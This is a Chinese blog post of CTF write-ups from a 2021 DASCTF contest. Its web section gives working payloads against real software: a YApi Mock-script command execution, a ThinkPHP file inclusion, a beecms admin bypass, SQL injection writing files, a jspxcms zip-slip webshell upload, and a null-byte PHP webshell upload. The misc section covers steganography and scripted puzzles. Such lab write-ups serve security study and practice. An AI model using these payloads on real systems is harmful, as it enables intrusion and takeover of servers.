---
butterId: butterId: 75186ee3-07e6-4e8e-8446-b7f6a3c08bf3 // blog image bucket id [Don't remove]
---

# Week8 Summary

## What have I done

- 2021DASCTF实战精英夏令营暨DASCTF July X CBCTF 4th 整理复现中

## [WriteUp] How did I accomplish these things

### Web

#### ezrce

题目给出的 YApi 环境是 1.9.2，搜索可知这个版本存在已知的 RCE 漏洞。添加一个 API，设置一个高级 Mock 脚本。

 ```javascript
const process = this.constructor.constructor('return process')()
mockJson = process.mainModule.require("child_process").execSync("cat /f*").toString()
 ```

![](https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1627798784656689/4623f9157e849515821906397d15fa00597eea23.png)

访问 API 的 Mock 地址即可获得 flag。

```flag
flag{d747e97d-58b0-4316-8740-3970e028c864}
```

#### easythinkphp

> https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ

直接使用参考中的 payload 包含出 flag。

```plain text
...//?m=Home&c=Index&a=index&value[_filename]=/flag
```

```flag
flag{0d004dc0-dbaf-41b5-a2cc-e21c1a5be878}
```

#### cat flag

> 管理员曾访问过flag

题目给出的代码如下。

```php
<?php

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    if (!preg_match('/flag/i',$cmd))
    {
        $cmd = escapeshellarg($cmd);
        system('cat ' . $cmd);
    }
} else {
    highlight_file(__FILE__);
}
?>
```

可以发现存在文件读取，结合提示先访问一下 nginx 的配置文件 `/var/log/nginx/access.log`。可以发现存在如下访问记录。

```plain text
127.0.0.1 - - [11/Jul/2020:00:00:00 +0000] "GET /this_is_final_flag_e2a457126032b42d.php HTTP/1.1" 200 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
```

此时可以尝试包含 `this_is_final_flag_e2a457126032b42d.php` 来获取 flag，但此处 flag 位于正则的黑名单内，需要使用一个 Unicode 字符来绕过。构造出 `this_is_final_f%falag_e2a457126032b42d.php` 即可绕过此处的黑名单而正常包含到文件，得到如下信息。

```php
<?php $flag='flag{2176d788-e2ed-4818-96ea-76ab24a64260}'; ?>
```

```flag
flag{2176d788-e2ed-4818-96ea-76ab24a64260}
```

#### cybercms

很明显靶机是 beecms，尝试寻找已存在的漏洞。使用如下载荷可以快速获得 admin 权限。

```http
POST /mx_form/mx_form.php?id=12 HTTP/1.1
Host: ddd436ed-9ebd-4e1d-b809-965543df5fff.node4.buuoj.cn
Content-Length: 96

_SESSION[login_in]=1&_SESSION[admin]=1&_SESSION[login_time]=100000000000000000000000000000000000
```

进入后台后发现文件上传处没有写权限，因此无法写入 shell 进行 RCE。此时回到登录界面，发现其中存在 SQL 注入，尝试一把梭写入 PHPINFO。

```http
POST /admin/login.php?action=ck_login HTTP/1.1
Host: ddd436ed-9ebd-4e1d-b809-965543df5fff.node4.buuoj.cn
Content-Length: 208
Origin: http://ddd436ed-9ebd-4e1d-b809-965543df5fff.node4.buuoj.cn
Content-Type: application/x-www-form-urlencoded

user=admin'/**/union/**/selselectect/**/0x3c3f70687020706870696e666f28293b203f3e,1,1,1,1/**/into/**/outfoutfileile/**/'/var/www/html/phpinfo.php'/**/%23&password=hex&code=&submit=true&submit.x=27&submit.y=31
```

发现可以成功访问到 PHPINFO，且没有 disable_functions，于是写 shell 进行 RCE，得到 flag。

```flag
flag{72723792-5469-43b9-b6c0-0d03b51b0193}
```

#### jspxcms

admin 和空密码登录到后台，发现有文件上传。使用冰蝎的 shell.jsp 构建 war 包，然后使用如下载荷构建恶意 zip 包。

```python
import zipfile

war = open('zfsn.war', 'rb').read()
zipFile = zipfile.ZipFile("zfsn.zip", "a", zipfile.ZIP_DEFLATED)
info = zipfile.ZipInfo("zfsn.zip")
zipFile.writestr("../../../zfsn.war", war)
zipFile.close()
```

将压缩文档以上传文件的方式上传到靶机，并点击解压，即可在 `.../zfsn/shell.jsp` 获得 shell。使用冰蝎连接即可得到 flag。

![](https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628063348856028/4fbd617592a2f64ebc53dc64e3ad154662f1ae0c.png)

```flag
flag{a72908e2-c6c3-455c-a129-17208d595884}
```

#### jj's camera

> 网上能搜到源码，仅修改了前端ui，注意服务器的响应

在网上可以找到关键部分 qdl.php 的源码。

```php
<?php
error_reporting(0);
$base64_img = trim($_POST['img']);
$id = trim($_GET['id']);
$url = trim($_GET['url']);
$up_dir = './img/';//存放在当前目录的img文件夹下
if(empty($id) || empty($url) || empty($base64_img)){ 
    exit;
}
if(!file_exists($up_dir)){
  mkdir($up_dir,0777);
}
if(preg_match('/^(data:\s*image\/(\w+);base64,)/', $base64_img, $result)){
  $type = $result[2];
  if(in_array($type,array('bmp','png'))){
    $new_file = $up_dir.$id.'_'.date('mdHis_').'.'.$type;
    file_put_contents($new_file, base64_decode(str_replace($result[1], '', $base64_img)));
    header("Location: ".$url);
  }
}
?>
```

发现其中存在文件的写入，拦截请求尝试构建载荷写入 shell，但是此处的文件名只有 `id` 是可控的位置。查看请求的 `X-Powered-By` 可知后端使用的是 PHP 5.2.17，而这个版本存在 `%00` 截断，因此可以使用如下的载荷写入 shell。

```http
POST /qbl.php?id=shell.php%00.png&url=http://baidu.com HTTP/1.1
Host: node4.buuoj.cn:25651
Content-Length: 76
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded

img=data%3Aimage%2Fpng%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUWyJoZXgiXSk7ID8%2b
```

利用 shell 即可得 flag。

```flag
flag{7bdd5754-549e-46ac-b2c4-17d86543ee8e}
```

### Misc

#### red_vs_blue

> 红队和蓝队将开展66轮对抗，你能预测出每轮对抗的结果吗？

有时间限制的猜测小游戏，需要连续猜对 66 次，一次 nc 连接的 66 个结果是固定的。因此只需要一边不断猜测一边记录结果，输了就按照结果重新猜测，即可最终到达 66 次。写出如下脚本来获取 flag。

```python
from pwn import *

proc = remote("node4.buuoj.cn", 29400)
proc.recvuntil("To get the flag if you predict the results of all games successfully!")
answers = {}
while True:
    response = proc.recvuntil("choose one [r] Red Team,[b] Blue Team:")
    position = response.index(b"Game")
    round: int = int(response[position + 5:position + 8].split(b"\n")[0])
    print(f"[+] length of answer {len(answers)}")
    if len(answers) < round:
        decision = "b"
    else:
        decision = answers[round - 1]
    proc.sendline(decision)
    print(f"[+] {round} round decision {decision}")
    response = proc.recvregex(r"(.*?)The result \w{3,4} Team")
    if (decision == "b" and b"The result Blue Team" in response) or (
            decision == "r" and b"The result Red Team" in response):
        answers[round - 1] = decision
        proc.recvregex(r"The number of successful predictions \d{1,2}")
        if round == 66:
            proc.recvuntil("\n")
            print(proc.recvuntil("\n").decode().strip())
            proc.close()
            exit(0)
    else:
        answers[round - 1] = ("r" if decision == "b" else "b")
        proc.sendafter("Play again? (y/n):", "y")
```

```flag
flag{4bb39602-5ad7-4110-a685-b1efbf555268}
```

#### funny_maze

> 七月被困在了迷宫里，十秒后迷宫的终点就要永远消失了，你能帮她走出迷宫吗？

对所给出的迷宫使用 DFS 计算最短可行路径，写出如下脚本来获取 flag。

```python
from pwn import *

MIN = 2147483647
mazeMaxArray = [[0 for _ in range(50)] for _ in range(50)]
signPoints = [[0 for _ in range(50)] for _ in range(50)]


def dfs(startX, startY, endX, endY, maze, stepCount):
    nextSteps = [[0, 1], [1, 0], [0, -1], [-1, 0]]  # right, down, left, up
    if startX == endX and startY == endY:
        global MIN
        if stepCount < MIN:
            MIN = stepCount
        return

    for nextStep in range(len(nextSteps)):
        nextX = startX + nextSteps[nextStep][0]
        nextY = startY + nextSteps[nextStep][1]

        if nextX < 0 or nextY < 0 or nextX > len(maze) or nextY > len(maze[0]):
            continue
        if mazeMaxArray[nextX][nextY] == 0 and signPoints[nextX][nextY] == 0:
            signPoints[nextX][nextY] = 1
            dfs(nextX, nextY, endX, endY, maze, stepCount + 1)
            signPoints[nextX][nextY] = 0
    return


proc = remote("node4.buuoj.cn", 28565)
proc.sendlineafter("3.Introduction to this game\n", "1")
for x in range(4):
    maze = proc.recvuntil("Please enter your answer:").decode().replace("Please enter your answer:", "")[:-1]
    maze = maze.split("\n")
    startY = 0
    startX = 0
    endY = 0
    endX = 0
    for line in range(len(maze)):
        for character in range(len(maze[line])):
            if maze[line][character] == "S":
                startX, startY = line, character
            if maze[line][character] == "E":
                endX, endY = line, character
    for line in maze[:]:
        line = line.translate(str.maketrans("SE", "  "))
    mazeArray = [[1 if character == "#" else 0 for character in line] for line in maze]
    for i in range(len(mazeArray)):
        for j in range(len(mazeArray[0])):
            mazeMaxArray[i][j] = mazeArray[i][j]
    signPoints[startX][startY] = 1
    dfs(startX, startY, endX, endY, mazeArray, 0)
    print(MIN + 1)
    proc.sendline(str(MIN + 1))
    if x == 3:
        proc.recvline()
        proc.recvline()
        print(proc.recvline().decode().strip())
        print(proc.recvline().decode().strip())
        print(proc.recvline().decode().strip())
        proc.close()
        exit(0)
    response = proc.recvuntil("So, Let's move on to the next level!\n")
    print(response.decode().strip())

    # reinitiate the map
    MIN = 2147483647
    mazeMaxArray = [[0 for _ in range(1000)] for _ in range(1000)]
    signPoints = [[0 for _ in range(1000)] for _ in range(1000)]
```

```flag
flag{a6fac77f-4695-4284-abd1-d38839fbca41}
```

#### Nuclear wastewater

> 小明去日本旅游时，发现了一张被核废水污染过的二维码，你能从中发现什么信息吗。

解压附件后可以得到如下图片。

![](https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628041914070540/0a0131de6eb133ca61a03eacff8395334530eb6d.png@100w)

观察其颜色可以发现大多数色块都只用了 R/G/B 其中一种颜色。因此写出如下脚本尝试将其中的值取出，发现一堆字符的出现频度有差别，进而进行词频统计。

```python
import collections
from PIL import Image

image = Image.open("./Nuclear wastewater.png")
width, height = image.size
data = []
for y in range(11, width - 10, 10):
    for x in range(11, height - 10, 10):
        r, g, b = image.getpixel((x, y))
        datum = r + g + b
        if 32 < datum < 127:
            data.append(chr(datum))

wordFrequency = collections.Counter(data)
for word, frequency in wordFrequency.most_common():
    if frequency == 1:
        break
    else:
        print(word, end="")
```

运行脚本可以得到如下关键信息。

```plain text
theKEYis:#R@/&p~!
```

使用此  key 解压附件中的压缩文档可得如下字符串。

```plain text
‌‌‌‌‌‌‌‍‎‍‎‌‌‌‌‌‌‌‍‎‍‌‌‌‌‌‌‌‌‍‎‍‎‌‌‌‌‌‌‌‍‎‍‍‌‍‌‎‌‌‍‍‍‎‌‌‌‌‌‌‌‌‍‎‎‍‌‍‍‌‌‌‍‍‎‎‌‌‌‌‌‌‌‌‍‎‍‍‌‌‌‌‌‌‌‍‎‎‌‌‍‌‎‎‎‍‌‌‍‌‍‌‌‎‎‍‎‌‌‎‌‌‍‍‌‌‍‎‍‌‍‍‌‍‌‎‌‌‎‌‌‍‍‌‍‍‌‍‎‎‎‎‎‍‌‍‌‍‌‍‎‍‍‌‍‌‌‌‌‌‌‌‎‍‍‍‌‌‌‌‌‌‍‌‎‎‌‌‌‌‌‌‌‍‍‌‎‎‌‌‌‌‌‌‍‍‌‎‌‌‌‌‌‌‌‍‌‎‎‌‌‌‌‌‌‌‍‍‍‍‌‌‍‌‌‎‍‌‎‌‌‍‌‍‍‍‎‍‎‍‎‌‍‌‌‌‌‌‌‌‎‍‍‍‌‌‌‌‌‌‍‌‌‍‌‌‌‌‌‌‌‍‌‌‎‍‌‌‌‌‌‌‌‍‎‍‍‌‍‌‎‌‌‌‌‍‌‌‌‍‌‍‎‍‌‌‍‎‎OIENKMAJOLEOKMAJOHECLHBCPGFDLNBIPAFFLPBKPIFNLEBBPPFKLFBAPEFBLJBMPHFCLEBBPMFJLEBBPLFOLHBCPCFHLNBIPDFGLHBCPPFKLIBNPHFCLDBGPGFDLBBEPPFKLHBCPPFKLMBJPDFGLCBHPHFCLBBEPIFNLNBIPOFLLMBJPDFGLBBEPEFBLBBEPPFKLGBDPOFLLABFPMFJLABFPCFHLNBIPDFGLMBJPEFBLIBNPHFCLLBOPOFLLBBEPIFNLDBGPAFFKAAFOPEKKDAGOGEDKJAMOAEFKLAOOIENLIBNPEFBLLBOPJFMLFBAPLFOLFBAPNFILEBBPLFOLFBAPAFFLJBMPHFCLJBMPBFELIBNPHFCLIBNPNFILBBEPPFKKPAKOHECKMAJOAEFKKAPOIENKFAAOLEOKHACOPEKKAAFOPEKKAAFOFEAKJAMOHECKLAOODEGKMAJOAEFKPAKONEIKBAEOIENKAAFODEGKAAFOPEKKLAOOOELKJAMOAEFKGADOFEAKEABOLEOKOALOLEOKJAMOAEFKIANOLEOKIANOEEBKFAAOHECKBAEOIENKJAMOKEPKMAJPMFJLCBHPEFBLNBI‌‍‌‌‌‍‍‌‎‌‍‌‍‌‌‌‍‌‎‎‎‍‌‍‎‎‌‌‍‎‍‌‎
```

很明显存在零宽字符隐写，使用如下三种字符解码可得提示。

```plain text
U+200C ZERO WIDTH NON-JOINER
U+200D ZERO WIDTH JOINER
U+200E LEFT-TO-RIGHT MARK
```

```plain text
2021年4月13日，核废水在Citrix县的CTX1市尤为严重
```

按照提示对去除隐写的字符串进行两次 Citrix CTX1 Decode 可得 flag。

```flag
flag{98047de9ce5aaa4c0031fb55e9dfac70}
```

#### Just a GIF

> 你能从GIF中找到小豆泥隐藏的flag吗？

 解压附件可得一个循环的小豆泥打拳动图，将其分帧可得 11 帧为一组的循环。参考 CISCN 2021 Quals 的动图题目，将每一组的图与第一组的对照后合并，可以得到九张包含类二维码的图和两张顺序图。

![](https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628043957019574/acb2f2d4b9866383393d8523ebe557185a893ead.png)

![](https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628043957089324/264269688a4baa36f4d0ac382f7d2428f1e6d43b.png)



将得到的九张图片按顺序排好可得一个 DataMatrix 码。

```python
from PIL import Image

# 7 1 6
# 9 3 4
# 5 2 8
pasteArray = [2, 8, 5, 6, 7, 3, 1, 9, 4]
resultImage = Image.new("RGB", (83 * 3, 83 * 3), "white")
for group in range(9):
    imageModel = Image.open("./gif/IMG{:05d}.bmp".format(group))
    image = Image.new("RGB", (83, 83), "white")
    width, height = imageModel.size
    for i in range(group + 11, 451, 11):
        imageSlice = Image.open("./gif/IMG{:05d}.bmp".format(i))
        for y in range(width):
            for x in range(height):
                if imageModel.getpixel((y, x)) != imageSlice.getpixel((y, x)):
                    print(y, x)
                    print(imageModel.getpixel((y, x)), imageSlice.getpixel((y, x)))
                    image.putpixel((y, x), (16, 63, 145))
    resultImage.paste(image, (
        ((pasteArray[group] - 1) % 3) * 83, ((pasteArray[group] - 1) // 3) * 83,
        ((pasteArray[group] - 1) % 3) * 83 + 83,
        ((pasteArray[group] - 1) // 3) * 83 + 83))
resultImage.save("result.png")
```

![](https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628044046032440/ca2d0d3cf3f4b90d86205296338807d85ccd3421.png@100w)

识别这个码可得 flag。

```flag
DASCTF{6bb73086aeb764b5727529d82b084cce}
```

#### ezSteganography

> [QIM量化 - 努力奋斗的阿贝拉](https://www.cnblogs.com/abella/p/9982322.html)

StegSolve 的 Data Extract 导出 Green plane 0 的图片可得如下信息。

![](https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628073325447688/eb36c389b6ce0d68f826ff546207cd719c3c53c7.png)

顺利得到了前一半的 flag `flag{2e9ec6480d0515` 以及后一半使用了 delta 为 20 的 QIM 量化的提示。

> https://github.com/pl561/QuantizationIndexModulation/blob/master/qim.py

 参考 GitHub 上的脚本写出如下脚本来提取出图片中的信息。

```python
"""Implementation of QIM method from Data Hiding Codes, Moulin and Koetter, 2005"""

from __future__ import print_function
from PIL import Image
import numpy as np
import matplotlib.pyplot as plt


class QIM:
    def __init__(self, delta):
        self.delta = delta

    def embed(self, x, m):
        """
        x is a vector of values to be quantized individually
        m is a binary vector of bits to be embeded
        returns: a quantized vector y
        """
        x = x.astype(float)
        d = self.delta
        y = np.round(x / d) * d + (-1) ** (m + 1) * d / 4.
        return y

    def detect(self, z):
        """
        z is the received vector, potentially modified
        returns: a detected vector z_detected and a detected message m_detected
        """

        shape = z.shape
        z = z.flatten()

        m_detected = np.zeros_like(z, dtype=float)
        z_detected = np.zeros_like(z, dtype=float)

        z0 = self.embed(z, 0)
        z1 = self.embed(z, 1)

        d0 = np.abs(z - z0)
        d1 = np.abs(z - z1)

        gen = zip(range(len(z_detected)), d0, d1)
        for i, dd0, dd1 in gen:
            if dd0 < dd1:
                m_detected[i] = 0
                z_detected[i] = z0[i]
            else:
                m_detected[i] = 1
                z_detected[i] = z1[i]

        z_detected = z_detected.reshape(shape)
        m_detected = m_detected.reshape(shape)
        return z_detected, m_detected.astype(int)


qim = QIM(delta=20)
image = np.array(Image.open("./ezSteganography-flag.png"))
green = image[:, :, 1].ravel()
[z_detected, msg_detected] = qim.detect(green)
plt.imshow(msg_detected.reshape(1440, 2560))
plt.savefig("steganography.png")
```

运行脚本可以得到下图，从而获得后一半 flag `0c211963984dcbc9f1}`。

![](https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628073094260532/aaef211d4c8254b08abca5e52fbe402cd456c93b.png)

```flag
flag{2e9ec6480d05150c211963984dcbc9f1}
```

## Summary

还有亿点就复现好了，Java Web 在冲了。
